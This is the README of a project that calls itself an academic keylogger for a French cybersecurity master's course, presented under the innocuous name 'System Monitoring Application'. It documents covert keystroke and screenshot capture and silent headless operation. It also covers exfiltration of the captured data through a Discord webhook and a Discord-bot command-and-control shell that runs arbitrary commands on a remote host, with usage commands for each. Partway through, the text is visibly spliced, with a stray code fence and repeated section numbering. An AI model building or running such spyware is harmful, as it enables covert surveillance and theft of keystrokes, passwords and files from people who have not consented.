# System Monitoring Application

Keylogger académique M2 Cybersécurité avec:
- Capture de frappe clavier (OS level)
- Capture d'écrans aléatoires
- Exfiltration Discord webhook
- Shell C2 via Discord bot

## Installation Rapide

```bash
pip install -r requirements.txt
```

## Utilisation Simple

### 1. Test local (console)
```bash
python main.py
```

### 2. Avec envoi Discord
```bash
python main.py --webhook <URL_WEBHOOK> --interval 10 --headless
```

### 3. Bot Discord C2
```bash
python shell_client.py YOUR_BOT_TOKEN
```

## Fichiers Principaux

| Fichier | Rôle |
|---------|------|
| `main.py` | Application principale |
| `keystroke_logger.py` | Capture des touches |
| `screenshot_capture.py` | Capture d'écran |
| `exfiltration.py` | Envoi Discord |
| `shell_client.py` | Bot Discord |
| `discord_setup.py` | Configuration Discord |

## Documentation

- [TEST_GUIDE.md](TEST_GUIDE.md) - Guide de test complet
- [QUICKSTART.md](QUICKSTART.md) - Démarrage rapide
- [DISCORD_BOT_SETUP.md](DISCORD_BOT_SETUP.md) - Configuration bot

## Données Collectées

Stockées dans: `~/.config/system_monitor/logs/`

- Fichiers JSON horodatés
- Frappes clavier + timestamps
- Captures d'écran PNG

Voir [TEST_GUIDE.md](TEST_GUIDE.md) pour vérifier les données.

# Mode silencieux
python main.py --headless
```

### 2. Avec Exfiltration Automatique

```bash
# Exfiltration toutes les 10 minutes
python main.py --exfil-interval 600

# Pour test: exfiltration toutes les 10 secondes
python main.py --exfil-interval 10 --shell
```

### 3. Avec Shell C2 Interactif

```bash
# Terminal 1: Lancer le serveur
python main.py --shell --port 9999

# Terminal 2: Se connecter au shell
python shell_client.py

# Ou commande unique
python shell_client.py -c "!info"
```

### 4. Tests Avancés

```bash
# Test d'exfiltration
python test_advanced.py 1

# Test du shell serveur
python test_advanced.py 2

# Système complet avec exfil périodique
python test_advanced.py 3

# Système complet avec shell
python test_advanced.py 4

# Shell interactif local (test)
python test_advanced.py 5
```

### Shell Client

**Commandes disponibles:**
```
Système:
  pwd               - Current directory
  ls                - List files
  whoami            - Current user
  cat <file>        - Read file
  (tous les autres) - Exécutés via shell

Builtin:
  !info             - System information
  !screenshot       - Capture immediately
  !logs             - List available data
  !exfil            - Prepare exfiltration
  !help             - Show help
```

**Client Shell:**
```bash
# Mode interactif
python shell_client.py

# Commande unique
python shell_client.py -c "!info"

# Vers hôte distant
python shell_client.py --host 192.168.1.10 -c "whoami"

# Port personnalisé
python shell_client.py --port 8888 -c "pwd"
```